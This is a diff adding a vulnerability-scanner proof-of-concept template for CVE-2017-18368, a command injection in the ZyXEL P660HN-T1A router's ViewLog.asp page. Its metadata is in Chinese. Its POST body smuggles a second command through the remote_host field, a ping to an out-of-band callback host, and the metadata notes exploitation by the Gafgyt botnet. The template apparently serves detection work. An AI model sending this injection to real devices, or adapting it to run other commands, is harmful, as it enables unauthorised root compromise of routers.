@@ -1,0 +1,40 @@
+[info]
+author = "AVE"
+description = "检测 ZyXEL P660HN-T1A v1 路由器 ViewLog.asp 页面 remote_host 参数的命令注入漏洞。未经认证的攻击者可通过 POST 请求注入任意系统命令，以 root 权限执行。该漏洞已被 Gafgyt 僵尸网络在野利用。"
+id = "POC-AVE-2017-0608"
+name = "ZyXEL P660HN-T1A ViewLog.asp 远程命令注入 PoC"
+severity = "critical"
+tags = [
+    "cve-2017-18368",
+    "zyxel",
+    "command-injection",
+    "router",
+]
+vuln_id = [
+    "CVE-2017-18368",
+    "AVE-2017-0608",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/ViewLog.asp"
+protocol = "http"
+
+[poc.requests.body]
+content = "remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bping+-c+3+{{interactsh-url}}%3b%23&remoteSubmit=Save"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "ViewLog.asp",
+    "remote_syslog_Flag",
+]
